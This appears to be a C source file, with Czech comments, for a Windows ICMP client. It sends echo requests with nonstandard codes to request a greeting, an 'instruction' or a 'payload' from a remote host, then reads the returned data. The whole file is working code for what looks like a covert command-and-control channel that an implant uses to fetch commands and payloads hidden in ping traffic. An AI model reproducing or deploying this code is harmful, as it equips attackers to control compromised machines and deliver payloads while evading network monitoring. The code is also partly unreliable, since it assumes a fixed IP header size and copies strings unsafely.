#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#include "icmp_headers.h"
#include "../../include/requests.h"

INT PostRecvfrom(SOCKET s, LPSTR buf, INT buflen, SOCKADDR* from, LPINT fromlen, WSAOVERLAPPED* ol) {
	WSABUF	wbuf;
	DWORD   flags,bytes;
	INT	rc;

	wbuf.buf = buf;
	wbuf.len = buflen;

	flags = 0;

	rc = WSARecvFrom(s, &wbuf, 1, &bytes, &flags, from, fromlen, ol, NULL);
	if (rc == SOCKET_ERROR) {
		if (WSAGetLastError() != WSA_IO_PENDING) {
			fprintf(stderr, "WSARecvFrom failed: %d\n", WSAGetLastError());
			return SOCKET_ERROR;
		}
	}
	return NO_ERROR;
}

struct addrinfo* ResolveAddress(LPSTR addr, LPSTR port, INT af, INT type, INT proto) {
	struct addrinfo hints,*res = NULL;
	INT rc;

	memset(&hints, 0, sizeof(hints));
	hints.ai_flags = ((addr) ? 0 : AI_PASSIVE);
	hints.ai_family = af;
	hints.ai_socktype = type;
	hints.ai_protocol = proto;

	rc = getaddrinfo(addr,port,&hints,&res);
	
	if (rc != 0) {
		fprintf(stderr, "Invalid address %s, getaddrinfo failed: %d\n", addr, rc);
		return NULL;
	}
	return res;
}

INT SendICMP(LPSTR destination, INT datasize, REQUEST_TYPE request_type, RESPONSE_TYPE *response_type, LPSTR payload) {
	WSADATA	wsd;
	SOCKET s = INVALID_SOCKET;
	LPSTR icmpbuf = NULL;
	SOCKADDR_STORAGE from;
	DWORD bytes, flags;
	INT	packetlen = 0, fromlen,time = 0, rc, i, status = 0;

	WSAOVERLAPPED recvol;
	struct addrinfo* dest = NULL, * local = NULL;


	recvol.hEvent = WSA_INVALID_EVENT;

	// Inicializace - WSAStartup
	if ((rc = WSAStartup(MAKEWORD(2, 2), &wsd)) != 0)
	{
		printf("WSAStartup() failed: %d\n", rc);
		status = -1;
		goto EXIT;
	}

	// Cílová adresa
	dest = ResolveAddress(destination, "0", AF_INET, 0, 0);
	
	if (dest == NULL) {
		printf("bad name %s\n", destination);
		status = -1;
		goto CLEANUP;
	}

	local = ResolveAddress(NULL,"0",AF_INET,0,0);

	if (local == NULL) {
		printf("Unable to obtain the bind address!\n");
		status = -1;
		goto CLEANUP;
	}

	// Vytvoøení RAW IPv4 socketu pro ICMP
	s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	if (s == INVALID_SOCKET) {
		printf("socket failed: %d\n", WSAGetLastError());
		status = -1;
		goto CLEANUP;
	}

	packetlen += sizeof(ICMP_HEADER);
	packetlen += datasize;

	icmpbuf = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetlen);
	if (icmpbuf == NULL) {
		fprintf(stderr, "HeapAlloc failed: %d\n", GetLastError());
		status = -1;
		goto CLEANUP;
	}

	// ICMP packet
	ICMP_HEADER* icmp_hdr = NULL;
	LPSTR datapart = NULL;

	icmp_hdr = (ICMP_HEADER*)icmpbuf;
	// ICMP požadavek typu ECHO
	icmp_hdr->icmp_type = 8;

	switch (request_type) {
		default:
		case GET_HELLO:
			icmp_hdr->icmp_code = 0;
			break;
		// Pro ostatní jsou potøeba administrtorská práva :/
		case GET_INSTRUCTION:
			icmp_hdr->icmp_code = 1;
			break;
		case GET_PAYLOAD:
			icmp_hdr->icmp_code = 2;
			break;
	}

	icmp_hdr->icmp_id = (USHORT)GetCurrentProcessId();
	icmp_hdr->icmp_checksum = 0;
	icmp_hdr->icmp_sequence = 0;

	datapart = icmpbuf + sizeof(ICMP_HEADER);

	memset(datapart, 'E', datasize);


	rc = bind(s, local->ai_addr, (INT)local->ai_addrlen);
	if (rc == SOCKET_ERROR) {
		fprintf(stderr, "bind failed: %d\n", WSAGetLastError());
		status = -1;
		goto CLEANUP;
	}

	memset(&recvol, 0, sizeof(recvol));
	recvol.hEvent = WSACreateEvent();
	if (recvol.hEvent == WSA_INVALID_EVENT) {
		fprintf(stderr, "WSACreateEvent failed: %d\n", WSAGetLastError());
		status = -1;
		goto CLEANUP;
	}

	CHAR recvbuf[MAX_RECV_BUF_LEN];
	INT recvbuflen = MAX_RECV_BUF_LEN;

	fromlen = sizeof(from);
	PostRecvfrom(s, recvbuf, recvbuflen, (SOCKADDR*)&from, &fromlen, &recvol);

	printf("\nPinging with %d bytes of data\n\n", datasize);

	ComputeIcmpChecksum(s, icmpbuf, packetlen, dest);

	time = GetTickCount64();
	rc = sendto(s, icmpbuf, packetlen,0, dest->ai_addr, (INT)dest->ai_addrlen);
  

	if (rc == SOCKET_ERROR) {
		fprintf(stderr, "sendto failed: %d\n", WSAGetLastError());
		status = -1;
		goto CLEANUP;
	}

	rc = WaitForSingleObject((HANDLE)recvol.hEvent, DEFAULT_RECV_TIMEOUT);
	if (rc == WAIT_FAILED) {
		fprintf(stderr, "WaitForSingleObject failed: %d\n", GetLastError());
		status = -1;
		goto CLEANUP;
	}
	else if (rc == WAIT_TIMEOUT) {
		printf("Request timed out.\n");
	}
	else {
		rc = WSAGetOverlappedResult(s, &recvol, &bytes, FALSE, &flags);
		if (rc == FALSE) {
			fprintf(stderr, "WSAGetOverlappedResult failed: %d\n", WSAGetLastError());
		}

		WSAResetEvent(recvol.hEvent);

		printf("Reply from: bytes=%d time<1ms TTL=%d\n", datasize, gTtl);

		fromlen = sizeof(from);
		PostRecvfrom(s, recvbuf, recvbuflen, (SOCKADDR*)&from, &fromlen, &recvol);
	}

	IPV4_HDR* iphdr = NULL;
	ICMP_HEADER* icmphdr = NULL;

	iphdr = (IPV4_HDR*)(recvbuf);
	INT hdrlen = (iphdr->ip_verlen & 0x0F) * 4;
	icmphdr = (ICMP_HEADER*)(recvbuf + sizeof(IPV4_HDR));
	/*
	Vypsání položky jako 8 bitù - 10111100 - Pro analýzu ve Wiresharku
	for (size_t i = 0; i < 1; i++) {
		for (int i = 7; 0 <= i; i--) {
					printf("%c", (icmphdr->icmp_checksum & (1 << i)) ? '1' : '0');
		}
		printf(" ");
	}
	*/
	LPSTR payload_temp = (LPSTR)(recvbuf + sizeof(IPV4_HDR) + sizeof(ICMP_HEADER));
	
	strncpy(payload, payload_temp, datasize);

	switch (icmphdr->icmp_code) {
		default:
		case 0:
			*response_type = RETURN_HELLO;
			break;
		case 1:
			*response_type = RETRUN_INSTRUCTION;
			break;
		case 2:
			*response_type = RETURN_PAYLOAD;
			break;
	}

CLEANUP:
	if (dest)
		freeaddrinfo(dest);
	if (local)
		freeaddrinfo(local);
	if (s != INVALID_SOCKET)
		closesocket(s);
	if (recvol.hEvent != WSA_INVALID_EVENT)
		WSACloseEvent(recvol.hEvent);
	if (icmpbuf)
		HeapFree(GetProcessHeap(), 0, icmpbuf);
	WSACleanup();
EXIT:
	return status;
}